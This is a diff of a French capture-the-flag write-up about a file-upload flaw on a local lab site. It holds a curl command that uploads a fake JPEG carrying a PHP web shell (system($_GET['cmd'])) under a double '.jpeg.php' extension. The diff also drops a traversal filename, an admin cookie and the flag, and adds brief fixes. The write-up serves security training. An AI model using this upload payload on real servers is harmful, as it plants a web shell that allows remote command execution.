@@ -10,14 +10,13 @@ qui me retournent: /tmp/img.jpeg succesfully uploaded.
 - et bien enfaite il faillait juste envoyer la commande curl en inversant .jpeg et .php:
 
 curl -X POST "http://localhost:8080/?page=upload" \
-  -H "Cookie: I_am_admin=68934a3e9455fa72420237eb05902327" \
   -H "Content-Type: multipart/form-data; boundary=----boundary" \
   --data-binary $'------boundary\r
 Content-Disposition: form-data; name="MAX_FILE_SIZE"\r
 \r
 100000\r
 ------boundary\r
-Content-Disposition: form-data; name="uploaded"; filename="../shell.jpeg.php"\r        
+Content-Disposition: form-data; name="uploaded"; filename="img.jpeg.php"\r        
 Content-Type: image/jpeg\r
 \r
 \xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>\xFF\xD9\r
@@ -31,4 +30,7 @@ Upload\r
 
 source :https://www.vaadata.com/blog/file-upload-vulnerabilities-and-security-best-practices/
 
-le flag est: 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
+RESOLUTION FAILLE:
+
+- Proteger l'exetension d'image
+- Verifier le contenu de l'image
